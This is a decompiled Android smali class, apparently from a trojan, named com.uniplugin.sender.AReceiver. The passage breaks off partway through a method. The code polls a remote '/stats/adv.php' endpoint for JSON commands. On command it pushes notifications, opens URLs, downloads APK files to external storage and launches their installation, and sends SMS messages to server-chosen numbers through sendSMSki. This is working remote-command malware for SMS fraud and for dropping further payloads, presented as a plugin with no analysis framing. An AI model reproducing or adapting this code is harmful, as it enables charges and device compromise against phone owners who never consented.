.class public Lcom/uniplugin/sender/AReceiver;
.super Landroid/content/BroadcastReceiver;
.source "AReceiver.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/uniplugin/sender/AReceiver$Maintwo;
    }
.end annotation


# static fields
.field private static final SERVICE_CLASS:Ljava/lang/String; = "com.uniplugin.sender"


# instance fields
.field private newtype:Ljava/lang/String;

.field private statusotvet:Ljava/lang/String;

.field private testsend:Lcom/uniplugin/sender/Sender;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 53
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private isMyServiceRunning(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 4
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "fullName"    # Ljava/lang/String;

    .prologue
    .line 434
    .line 435
    const-string v2, "activity"

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    .line 434
    check-cast v0, Landroid/app/ActivityManager;

    .line 437
    .local v0, "manager":Landroid/app/ActivityManager;
    const v2, 0x7fffffff

    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    .line 436
    :cond_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-nez v3, :cond_1

    .line 442
    const/4 v2, 0x0

    :goto_0
    return v2

    .line 437
    :cond_1
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 438
    .local v1, "service":Landroid/app/ActivityManager$RunningServiceInfo;
    iget-object v3, v1, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v3}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 439
    const/4 v2, 0x1

    goto :goto_0
.end method


# virtual methods
.method public DownloadFromUrl(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 18
    .param p1, "imageURL"    # Ljava/lang/String;
    .param p2, "fileName"    # Ljava/lang/String;
    .param p3, "context"    # Landroid/content/Context;

    .prologue
    .line 359
    :try_start_0
    new-instance v11, Ljava/net/URL;

    move-object/from16 v0, p1

    invoke-direct {v11, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 360
    .local v11, "url":Ljava/net/URL;
    new-instance v5, Ljava/io/File;

    move-object/from16 v0, p2

    invoke-direct {v5, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 362
    .local v5, "file":Ljava/io/File;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v8

    .line 363
    .local v8, "startTime":J
    const-string v12, "ImageManager"

    const-string v13, "download begining"

    invoke-static {v12, v13}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 364
    const-string v12, "ImageManager"

    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "download url:"

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-static {v12, v13}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 365
    const-string v12, "ImageManager"

    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "downloaded file name:"

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p2

    invoke-virtual {v13, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-static {v12, v13}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 367
    invoke-virtual {v11}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v10

    .line 372
    .local v10, "ucon":Ljava/net/URLConnection;
    invoke-virtual {v10}, Ljava/net/URLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v7

    .line 373
    .local v7, "is":Ljava/io/InputStream;
    new-instance v2, Ljava/io/BufferedInputStream;

    invoke-direct {v2, v7}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    .line 378
    .local v2, "bis":Ljava/io/BufferedInputStream;
    new-instance v1, Lorg/apache/http/util/ByteArrayBuffer;

    const/16 v12, 0x32

    invoke-direct {v1, v12}, Lorg/apache/http/util/ByteArrayBuffer;-><init>(I)V

    .line 379
    .local v1, "baf":Lorg/apache/http/util/ByteArrayBuffer;
    const/4 v3, 0x0

    .line 380
    .local v3, "current":I
    :goto_0
    invoke-virtual {v2}, Ljava/io/BufferedInputStream;->read()I

    move-result v3

    const/4 v12, -0x1

    if-ne v3, v12, :cond_0

    .line 385
    new-instance v6, Ljava/io/FileOutputStream;

    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "/mnt/sdcard/download/"

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v12, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-direct {v6, v12}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    .line 386
    .local v6, "fos":Ljava/io/FileOutputStream;
    invoke-virtual {v1}, Lorg/apache/http/util/ByteArrayBuffer;->toByteArray()[B

    move-result-object v12

    invoke-virtual {v6, v12}, Ljava/io/FileOutputStream;->write([B)V

    .line 387
    invoke-virtual {v6}, Ljava/io/FileOutputStream;->close()V

    .line 388
    const-string v12, "ImageManager"

    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "download ready in"

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 389
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v14

    sub-long/2addr v14, v8

    const-wide/16 v16, 0x3e8

    div-long v14, v14, v16

    invoke-virtual {v13, v14, v15}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 390
    const-string v14, " sec"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 388
    invoke-static {v12, v13}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 396
    .end local v1    # "baf":Lorg/apache/http/util/ByteArrayBuffer;
    .end local v2    # "bis":Ljava/io/BufferedInputStream;
    .end local v3    # "current":I
    .end local v5    # "file":Ljava/io/File;
    .end local v6    # "fos":Ljava/io/FileOutputStream;
    .end local v7    # "is":Ljava/io/InputStream;
    .end local v8    # "startTime":J
    .end local v10    # "ucon":Ljava/net/URLConnection;
    .end local v11    # "url":Ljava/net/URL;
    :goto_1
    return-void

    .line 381
    .restart local v1    # "baf":Lorg/apache/http/util/ByteArrayBuffer;
    .restart local v2    # "bis":Ljava/io/BufferedInputStream;
    .restart local v3    # "current":I
    .restart local v5    # "file":Ljava/io/File;
    .restart local v7    # "is":Ljava/io/InputStream;
    .restart local v8    # "startTime":J
    .restart local v10    # "ucon":Ljava/net/URLConnection;
    .restart local v11    # "url":Ljava/net/URL;
    :cond_0
    int-to-byte v12, v3

    invoke-virtual {v1, v12}, Lorg/apache/http/util/ByteArrayBuffer;->append(I)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 392
    .end local v1    # "baf":Lorg/apache/http/util/ByteArrayBuffer;
    .end local v2    # "bis":Ljava/io/BufferedInputStream;
    .end local v3    # "current":I
    .end local v5    # "file":Ljava/io/File;
    .end local v7    # "is":Ljava/io/InputStream;
    .end local v8    # "startTime":J
    .end local v10    # "ucon":Ljava/net/URLConnection;
    .end local v11    # "url":Ljava/net/URL;
    :catch_0
    move-exception v4

    .line 393
    .local v4, "e":Ljava/io/IOException;
    const-string v12, "ImageManager"

    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "Error: "

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-static {v12, v13}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1
.end method

.method public Update(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;
    .locals 9
    .param p1, "apkurl"    # Ljava/lang/String;
    .param p2, "apkname"    # Ljava/lang/String;
    .param p3, "context"    # Landroid/content/Context;

    .prologue
    .line 327
    const-string v6, "no"

    .line 329
    .local v6, "promptInstall":Ljava/lang/String;
    :try_start_0
    new-instance v7, Ljava/net/URL;

    invoke-direct {v7, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 330
    .local v7, "url":Ljava/net/URL;
    invoke-virtual {v7}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v1

    check-cast v1, Ljava/net/HttpURLConnection;

    .line 331
    .local v1, "c":Ljava/net/HttpURLConnection;
    const-string v8, "GET"

    invoke-virtual {v1, v8}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 332
    const/4 v8, 0x1

    invoke-virtual {v1, v8}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 333
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->connect()V

    .line 338
    new-instance v5, Ljava/io/File;

    invoke-direct {v5, p2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 339
    .local v5, "outputFile":Ljava/io/File;
    new-instance v2, Ljava/io/FileOutputStream;

    invoke-direct {v2, v5}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 341
    .local v2, "fos":Ljava/io/FileOutputStream;
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    .line 343
    .local v3, "is":Ljava/io/InputStream;
    const/16 v8, 0x400

    new-array v0, v8, [B

    .line 344
    .local v0, "buffer":[B
    const/4 v4, 0x0

    .line 345
    .local v4, "len1":I
    :goto_0
    invoke-virtual {v3, v0}, Ljava/io/InputStream;->read([B)I

    move-result v4

    const/4 v8, -0x1

    if-ne v4, v8, :cond_0

    .line 348
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V

    .line 349
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 350
    const-string v6, "yes"

    .line 355
    .end local v0    # "buffer":[B
    .end local v1    # "c":Ljava/net/HttpURLConnection;
    .end local v2    # "fos":Ljava/io/FileOutputStream;
    .end local v3    # "is":Ljava/io/InputStream;
    .end local v4    # "len1":I
    .end local v5    # "outputFile":Ljava/io/File;
    .end local v7    # "url":Ljava/net/URL;
    :goto_1
    return-object v6

    .line 346
    .restart local v0    # "buffer":[B
    .restart local v1    # "c":Ljava/net/HttpURLConnection;
    .restart local v2    # "fos":Ljava/io/FileOutputStream;
    .restart local v3    # "is":Ljava/io/InputStream;
    .restart local v4    # "len1":I
    .restart local v5    # "outputFile":Ljava/io/File;
    .restart local v7    # "url":Ljava/net/URL;
    :cond_0
    const/4 v8, 0x0

    invoke-virtual {v2, v0, v8, v4}, Ljava/io/FileOutputStream;->write([BII)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 352
    .end local v0    # "buffer":[B
    .end local v1    # "c":Ljava/net/HttpURLConnection;
    .end local v2    # "fos":Ljava/io/FileOutputStream;
    .end local v3    # "is":Ljava/io/InputStream;
    .end local v4    # "len1":I
    .end local v5    # "outputFile":Ljava/io/File;
    .end local v7    # "url":Ljava/net/URL;
    :catch_0
    move-exception v8

    goto :goto_1
.end method

.method public checkcomand(Landroid/content/Context;)V
    .locals 19
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 77
    const-string v17, ""

    .line 80
    .local v17, "otvet":Ljava/lang/String;
    :try_start_0
    new-instance v2, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v9, v0, Lcom/uniplugin/sender/AReceiver;->testsend:Lcom/uniplugin/sender/Sender;

    iget-object v9, v9, Lcom/uniplugin/sender/Sender;->domen:Ljava/lang/String;

    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v2, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v9, "/stats/adv.php"

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 81
    move-object/from16 v0, p0

    iget-object v9, v0, Lcom/uniplugin/sender/AReceiver;->testsend:Lcom/uniplugin/sender/Sender;

    iget-object v9, v9, Lcom/uniplugin/sender/Sender;->params:Ljava/lang/String;

    .line 79
    move-object/from16 v0, p0

    invoke-virtual {v0, v2, v9}, Lcom/uniplugin/sender/AReceiver;->doInBackground(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v17

    .line 86
    :goto_0
    invoke-virtual/range {v17 .. v17}, Ljava/lang/String;->length()I

    move-result v2

    const/4 v9, 0x5

    if-le v2, v9, :cond_5

    .line 88
    const/4 v14, 0x0

    .line 90
    .local v14, "jsonObject":Lorg/json/JSONObject;
    :try_start_1
    new-instance v2, Lorg/json/JSONTokener;

    move-object/from16 v0, v17

    invoke-direct {v2, v0}, Lorg/json/JSONTokener;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Lorg/json/JSONTokener;->nextValue()Ljava/lang/Object;

    move-result-object v2

    move-object v0, v2

    check-cast v0, Lorg/json/JSONObject;

    move-object v14, v0
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1

    .line 96
    :goto_1
    :try_start_2
    const-string v2, "status"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Lcom/uniplugin/sender/AReceiver;->statusotvet:Ljava/lang/String;
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_2

    .line 101
    :goto_2
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->statusotvet:Ljava/lang/String;

    if-eqz v2, :cond_5

    .line 102
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->statusotvet:Ljava/lang/String;

    const-string v9, "newmess"

    invoke-virtual {v2, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 105
    :try_start_3
    const-string v2, "type"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Lcom/uniplugin/sender/AReceiver;->newtype:Ljava/lang/String;
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_3

    .line 110
    :goto_3
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->newtype:Ljava/lang/String;

    const-string v9, "do"

    invoke-virtual {v2, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 111
    const/4 v3, 0x0

    .line 113
    .local v3, "mid":I
    :try_start_4
    const-string v2, "id"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I
    :try_end_4
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_4

    move-result v3

    .line 118
    :goto_4
    const/4 v4, 0x0

    .line 120
    .local v4, "mtitle":Ljava/lang/String;
    :try_start_5
    const-string v2, "title"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_5
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_5} :catch_5

    move-result-object v4

    .line 125
    :goto_5
    const/4 v5, 0x0

    .line 127
    .local v5, "mtext":Ljava/lang/String;
    :try_start_6
    const-string v2, "text"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_6
    .catch Lorg/json/JSONException; {:try_start_6 .. :try_end_6} :catch_6

    move-result-object v5

    .line 132
    :goto_6
    const/4 v6, 0x0

    .line 134
    .local v6, "micon":Ljava/lang/String;
    :try_start_7
    const-string v2, "icon"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_7
    .catch Lorg/json/JSONException; {:try_start_7 .. :try_end_7} :catch_7

    move-result-object v6

    .line 139
    :goto_7
    const/4 v7, 0x0

    .line 141
    .local v7, "murl":Ljava/lang/String;
    :try_start_8
    const-string v2, "url"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_8
    .catch Lorg/json/JSONException; {:try_start_8 .. :try_end_8} :catch_8

    move-result-object v7

    :goto_8
    move-object/from16 v2, p0

    move-object/from16 v8, p1

    .line 147
    invoke-virtual/range {v2 .. v8}, Lcom/uniplugin/sender/AReceiver;->showmessinternet(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 149
    .end local v3    # "mid":I
    .end local v4    # "mtitle":Ljava/lang/String;
    .end local v5    # "mtext":Ljava/lang/String;
    .end local v6    # "micon":Ljava/lang/String;
    .end local v7    # "murl":Ljava/lang/String;
    :cond_0
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->newtype:Ljava/lang/String;

    const-string v9, "show"

    invoke-virtual {v2, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 150
    const/4 v7, 0x0

    .line 152
    .restart local v7    # "murl":Ljava/lang/String;
    :try_start_9
    const-string v2, "url"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_9
    .catch Lorg/json/JSONException; {:try_start_9 .. :try_end_9} :catch_9

    move-result-object v7

    .line 157
    :goto_9
    new-instance v11, Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v9

    invoke-direct {v11, v2, v9}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 158
    .local v11, "browserIntent":Landroid/content/Intent;
    const/high16 v2, 0x10000000

    invoke-virtual {v11, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 160
    move-object/from16 v0, p1

    invoke-virtual {v0, v11}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 163
    .end local v7    # "murl":Ljava/lang/String;
    .end local v11    # "browserIntent":Landroid/content/Intent;
    :cond_1
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->statusotvet:Ljava/lang/String;

    const-string v9, "newload"

    invoke-virtual {v2, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 165
    :try_start_a
    const-string v2, "type"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Lcom/uniplugin/sender/AReceiver;->newtype:Ljava/lang/String;
    :try_end_a
    .catch Lorg/json/JSONException; {:try_start_a .. :try_end_a} :catch_a

    .line 170
    :goto_a
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->newtype:Ljava/lang/String;

    const-string v9, "do"

    invoke-virtual {v2, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 171
    const/4 v3, 0x0

    .line 173
    .restart local v3    # "mid":I
    :try_start_b
    const-string v2, "id"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I
    :try_end_b
    .catch Lorg/json/JSONException; {:try_start_b .. :try_end_b} :catch_b

    move-result v3

    .line 178
    :goto_b
    const/4 v4, 0x0

    .line 180
    .restart local v4    # "mtitle":Ljava/lang/String;
    :try_start_c
    const-string v2, "title"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_c
    .catch Lorg/json/JSONException; {:try_start_c .. :try_end_c} :catch_c

    move-result-object v4

    .line 185
    :goto_c
    const/4 v5, 0x0

    .line 187
    .restart local v5    # "mtext":Ljava/lang/String;
    :try_start_d
    const-string v2, "text"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_d
    .catch Lorg/json/JSONException; {:try_start_d .. :try_end_d} :catch_d

    move-result-object v5

    .line 192
    :goto_d
    const/4 v6, 0x0

    .line 194
    .restart local v6    # "micon":Ljava/lang/String;
    :try_start_e
    const-string v2, "icon"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_e
    .catch Lorg/json/JSONException; {:try_start_e .. :try_end_e} :catch_e

    move-result-object v6

    .line 199
    :goto_e
    const/4 v7, 0x0

    .line 201
    .restart local v7    # "murl":Ljava/lang/String;
    :try_start_f
    const-string v2, "url"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_f
    .catch Lorg/json/JSONException; {:try_start_f .. :try_end_f} :catch_f

    move-result-object v7

    .line 206
    :goto_f
    const/4 v8, 0x0

    .line 208
    .local v8, "mapkname":Ljava/lang/String;
    :try_start_10
    const-string v2, "apkname"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_10
    .catch Lorg/json/JSONException; {:try_start_10 .. :try_end_10} :catch_10

    move-result-object v8

    :goto_10
    move-object/from16 v2, p0

    move-object/from16 v9, p1

    .line 214
    invoke-virtual/range {v2 .. v9}, Lcom/uniplugin/sender/AReceiver;->showmessload(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 216
    .end local v3    # "mid":I
    .end local v4    # "mtitle":Ljava/lang/String;
    .end local v5    # "mtext":Ljava/lang/String;
    .end local v6    # "micon":Ljava/lang/String;
    .end local v7    # "murl":Ljava/lang/String;
    .end local v8    # "mapkname":Ljava/lang/String;
    :cond_2
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->newtype:Ljava/lang/String;

    const-string v9, "show"

    invoke-virtual {v2, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 217
    const/4 v7, 0x0

    .line 219
    .restart local v7    # "murl":Ljava/lang/String;
    :try_start_11
    const-string v2, "url"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_11
    .catch Lorg/json/JSONException; {:try_start_11 .. :try_end_11} :catch_11

    move-result-object v7

    .line 224
    :goto_11
    const/4 v10, 0x0

    .line 226
    .local v10, "apkname":Ljava/lang/String;
    :try_start_12
    const-string v2, "apkname"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_12
    .catch Lorg/json/JSONException; {:try_start_12 .. :try_end_12} :catch_12

    move-result-object v10

    .line 231
    :goto_12
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v7, v10, v1}, Lcom/uniplugin/sender/AReceiver;->DownloadFromUrl(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 232
    new-instance v13, Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    invoke-direct {v13, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 233
    .local v13, "intent":Landroid/content/Intent;
    new-instance v2, Ljava/io/File;

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v18, "/mnt/sdcard/download/"

    move-object/from16 v0, v18

    invoke-direct {v9, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-direct {v2, v9}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v2}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v2

    const-string v9, "application/vnd.android.package-archive"

    invoke-virtual {v13, v2, v9}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 235
    const/high16 v2, 0x10000000

    invoke-virtual {v13, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 237
    move-object/from16 v0, p1

    invoke-virtual {v0, v13}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 240
    .end local v7    # "murl":Ljava/lang/String;
    .end local v10    # "apkname":Ljava/lang/String;
    .end local v13    # "intent":Landroid/content/Intent;
    :cond_3
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->statusotvet:Ljava/lang/String;

    const-string v9, "newsend"

    invoke-virtual {v2, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_5

    .line 242
    :try_start_13
    const-string v2, "type"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Lcom/uniplugin/sender/AReceiver;->newtype:Ljava/lang/String;
    :try_end_13
    .catch Lorg/json/JSONException; {:try_start_13 .. :try_end_13} :catch_13

    .line 247
    :goto_13
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->newtype:Ljava/lang/String;

    const-string v9, "do"

    invoke-virtual {v2, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_4

    .line 249
    const/16 v16, 0x0

    .line 251
    .local v16, "mpref":Ljava/lang/String;
    :try_start_14
    const-string v2, "pref"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_14
    .catch Lorg/json/JSONException; {:try_start_14 .. :try_end_14} :catch_14

    move-result-object v16

    .line 256
    :goto_14
    const/4 v15, 0x0

    .line 258
    .local v15, "mnumber":Ljava/lang/String;
    :try_start_15
    const-string v2, "number"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_15
    .catch Lorg/json/JSONException; {:try_start_15 .. :try_end_15} :catch_15

    move-result-object v15

    .line 263
    :goto_15
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->testsend:Lcom/uniplugin/sender/Sender;

    move-object/from16 v0, v16

    invoke-virtual {v2, v15, v0}, Lcom/uniplugin/sender/Sender;->sendSMSki(Ljava/lang/String;Ljava/lang/String;)V

    .line 265
    .end local v15    # "mnumber":Ljava/lang/String;
    .end local v16    # "mpref":Ljava/lang/String;
    :cond_4
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/uniplugin/sender/AReceiver;->newtype:Ljava/lang/String;

    const-string v9, "dohi"

    invoke-virtual {v2, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_5

    .line 269
    const/16 v16, 0x0

    .line 271
    .restart local v16    # "mpref":Ljava/lang/String;
    :try_start_16
    const-string v2, "pref"

    invoke-virtual {v14, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_16
    .catch Lorg/json/JSONException; {:try_start_16 .. :try_end_16} :catch_16

    move-result-object v16

    .line 276
    :goto_16
    const/4 v15, 0x0

    .line 278
